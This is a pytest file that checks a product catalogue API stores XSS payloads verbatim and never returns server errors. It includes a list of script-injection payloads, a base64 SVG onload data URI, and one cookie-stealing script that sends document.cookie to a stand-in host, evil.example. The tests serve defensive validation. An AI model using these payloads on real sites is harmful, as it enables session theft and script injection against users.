"""XSS prevention tests.

Verifies that HTML/script injection in stored fields does NOT cause server
errors and that the API returns payloads as JSON-encoded strings (not
executed content). Each test sets up and tears down its own data.
"""

import uuid

import pytest


def _unique(payload: str) -> str:
    """Append a unique suffix so repeated runs/loops never hit 409 duplicate."""
    return f"{payload}-{uuid.uuid4().hex[:8]}"


# Common XSS payloads targeting various injection points
XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(document.cookie)</script>',
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src='javascript:alert(1)'></iframe>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<body onload=alert('XSS')>",
    '<<SCRIPT>alert("XSS");//<</SCRIPT>',
    "<IMG SRC=\"jav&#x09;ascript:alert('XSS');\">",
]


def _create_product_with_payload(client, field, payload, category="Snacks"):
    """Create a product with an XSS payload in the given field."""
    payload_data = {
        "name": "SafeName" if field != "name" else payload,
        "type": category,
    }
    if field != "name":
        payload_data[field] = payload
    return client.post("/api/products", json=payload_data)


class TestProductNameXss:
    """XSS payloads in product name are stored and returned as literal strings."""

    def test_script_tag_in_name_stored_as_string(self, client, seed_category):
        """<script> in product name must be stored and returned verbatim.

        The API stores the raw string and returns it as a JSON-encoded
        string (output escaping is the frontend's job) — the round-trip
        must be exact, with no HTML-escaping or mangling server-side.
        """
        payload = _unique("<script>alert(1)</script>")
        resp = client.post(
            "/api/products",
            json={"name": payload, "type": "Snacks"},
        )
        assert resp.status_code == 201, (
            f"expected 201, got {resp.status_code}: {resp.get_json()}"
        )
        pid = resp.get_json()["id"]
        get_resp = client.get(f"/api/products/{pid}")
        assert get_resp.status_code == 200
        # Stored value must round-trip verbatim — not stripped, not HTML-escaped.
        assert get_resp.get_json()["name"] == payload

    @pytest.mark.parametrize("xss_payload", XSS_PAYLOADS)
    def test_xss_payloads_in_name_stored_verbatim(self, client, seed_category, xss_payload):
        """XSS payload in product name is accepted and round-trips verbatim."""
        name = _unique(xss_payload)
        resp = client.post(
            "/api/products",
            json={"name": name, "type": "Snacks"},
        )
        assert resp.status_code == 201, (
            f"XSS payload {xss_payload!r} expected 201, got {resp.status_code}"
        )
        pid = resp.get_json()["id"]
        get_resp = client.get(f"/api/products/{pid}")
        assert get_resp.status_code == 200
        assert get_resp.get_json()["name"] == name

    def test_xss_in_name_returned_as_json_string(self, client, seed_category):
        """XSS payload stored in name must be returned as a JSON string, not HTML."""
        payload = _unique("<script>alert('xss')</script>")
        create_resp = client.post(
            "/api/products",
            json={"name": payload, "type": "Snacks"},
        )
        assert create_resp.status_code == 201, (
            f"Create failed with {create_resp.status_code}: {create_resp.get_json()}"
        )
        pid = create_resp.get_json()["id"]
        assert pid

        list_resp = client.get("/api/products")
        assert list_resp.status_code == 200
        products = list_resp.get_json()["products"]
        matching = [p for p in products if p["id"] == pid]
        assert len(matching) == 1, "Stored product not found in listing"
        # Name must be the raw string, not escaped HTML
        assert matching[0]["name"] == payload


class TestProductDescriptionXss:
    """XSS payloads in product description fields (ingredients, taste_note) are safe."""

    @pytest.mark.parametrize("xss_payload", XSS_PAYLOADS)
    def test_xss_in_ingredients_stored_verbatim(self, client, seed_category, xss_payload):
        """XSS in ingredients is accepted (201) and round-trips verbatim."""
        name = _unique("IngXss")
        resp = client.post(
            "/api/products",
            json={
                "name": name,
                "type": "Snacks",
                "ingredients": xss_payload,
            },
        )
        assert resp.status_code == 201, (
            f"XSS in ingredients expected 201, got {resp.status_code}: {xss_payload!r}"
        )
        pid = resp.get_json()["id"]
        get_resp = client.get(f"/api/products/{pid}")
        assert get_resp.status_code == 200
        assert get_resp.get_json()["ingredients"] == xss_payload

    def test_xss_in_ingredients_stored_correctly(self, client, seed_category):
        """XSS payload in ingredients is stored and returned verbatim."""
        payload = "<script>document.location='http://evil.example/steal?c='+document.cookie</script>"
        resp = client.post(
            "/api/products",
            json={
                "name": _unique("IngXssProduct"),
                "type": "Snacks",
                "ingredients": payload,
            },
        )
        assert resp.status_code == 201, (
            f"Create failed with {resp.status_code}: {resp.get_json()}"
        )
        pid = resp.get_json()["id"]
        list_resp = client.get("/api/products")
        assert list_resp.status_code == 200
        products = list_resp.get_json()["products"]
        matching = [p for p in products if p["id"] == pid]
        assert len(matching) == 1, "Stored product not found in listing"
        # Stored value must match input exactly
        assert matching[0]["ingredients"] == payload

    @pytest.mark.parametrize("xss_payload", XSS_PAYLOADS)
    def test_xss_in_taste_note_stored_verbatim(self, client, seed_category, xss_payload):
        """XSS payload in taste_note is accepted and round-trips verbatim."""
        name = _unique("TasteNoteXss")
        resp = client.post(
            "/api/products",
            json={
                "name": name,
                "type": "Snacks",
                "taste_note": xss_payload,
            },
        )
        assert resp.status_code == 201
        pid = resp.get_json()["id"]
        get_resp = client.get(f"/api/products/{pid}")
        assert get_resp.status_code == 200
        assert get_resp.get_json()["taste_note"] == xss_payload

    @pytest.mark.parametrize("xss_payload", XSS_PAYLOADS)
    def test_xss_in_brand_stored_verbatim(self, client, seed_category, xss_payload):
        """XSS payload in brand field is accepted and round-trips verbatim."""
        name = _unique("BrandXss")
        resp = client.post(
            "/api/products",
            json={
                "name": name,
                "type": "Snacks",
                "brand": xss_payload,
            },
        )
        assert resp.status_code == 201
        pid = resp.get_json()["id"]
        get_resp = client.get(f"/api/products/{pid}")
        assert get_resp.status_code == 200
        assert get_resp.get_json()["brand"] == xss_payload


class TestCategoryXss:
    """XSS payloads in category labels and emoji fields are handled safely."""

    def test_xss_in_category_label_no_server_error(self, client):
        """XSS payload in category label must not cause a 500 error."""
        for payload in XSS_PAYLOADS[:3]:
            resp = client.post(
                "/api/categories",
                json={"name": "XssTestCat", "label": payload, "emoji": "🍕"},
            )
            assert resp.status_code != 500

    def test_xss_in_category_label_update_no_server_error(self, client):
        """XSS in category label update must not cause a 500 error."""
        # First create the category
        client.post(
            "/api/categories",
            json={"name": "UpdateXssCat", "label": "Normal"},
        )
        # Then update with XSS payload in label
        for payload in XSS_PAYLOADS[:3]:
            resp = client.put(
                "/api/categories/UpdateXssCat",
                json={"label": payload},
            )
            assert resp.status_code != 500


class TestTagXss:
    """XSS payloads in tag labels are stored safely."""

    def test_xss_in_tag_label_rejected_or_stored(self, client):
        """XSS payload in tag label either gets rejected (too long) or stored as string."""
        for payload in XSS_PAYLOADS[:5]:
            resp = client.post(
                "/api/tags",
                json={"label": payload},
            )
            # 201 (stored), 400 (invalid — too long/invalid chars), never 500
            assert resp.status_code in (201, 400), (
                f"XSS tag label caused HTTP {resp.status_code}: {payload!r}"
            )
            assert resp.status_code != 500

    def test_tag_search_with_xss_payload(self, client):
        """XSS payload in tag search query must not cause a server error."""
        for payload in XSS_PAYLOADS[:3]:
            resp = client.get(f"/api/tags?q={payload}")
            assert resp.status_code == 200
            data = resp.get_json()
            assert isinstance(data, list)


class TestTranslationXss:
    """XSS payloads in translation strings are returned as JSON strings."""

    def test_xss_in_translation_value_no_server_error(self, client):
        """Setting a translation value with XSS payload must not cause a 500."""
        payload = "<script>alert(1)</script>"
        resp = client.put(
            "/api/translations/en",
            json={"product_label": payload},
        )
        # May succeed (200) or fail validation (400) — never 500
        assert resp.status_code != 500

    def test_xss_in_translation_key_query_no_server_error(self, client):
        """Requesting translations must not cause a 500."""
        resp = client.get("/api/translations/en")
        assert resp.status_code in (200, 404)
        assert resp.status_code != 500


class TestImageDataUriXss:
    """XSS payloads embedded in image data URIs are stored safely."""

    def test_xss_in_image_field_no_server_error(self, client, seed_category):
        """XSS payload embedded in image field must not cause a 500."""
        # Use a data URI with embedded script-like content
        xss_image = "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"
        resp = client.post(
            "/api/products",
            json={
                "name": "ImageXssProduct",
                "type": "Snacks",
                "image": xss_image,
            },
        )
        assert resp.status_code != 500

    def test_update_product_image_with_xss_no_server_error(self, client, db, seed_category):
        """Updating a product image with XSS-like data URI must not cause a 500."""
        db.execute(
            "INSERT INTO products (name, type) VALUES (?, ?)",
            ("UpdateImageXss", "Snacks"),
        )
        db.commit()
        pid = db.execute(
            "SELECT id FROM products WHERE name = ?", ("UpdateImageXss",)
        ).fetchone()["id"]

        xss_image = "data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+"
        resp = client.put(
            f"/api/products/{pid}",
            json={"name": "UpdateImageXss", "image": xss_image},
        )
        assert resp.status_code != 500
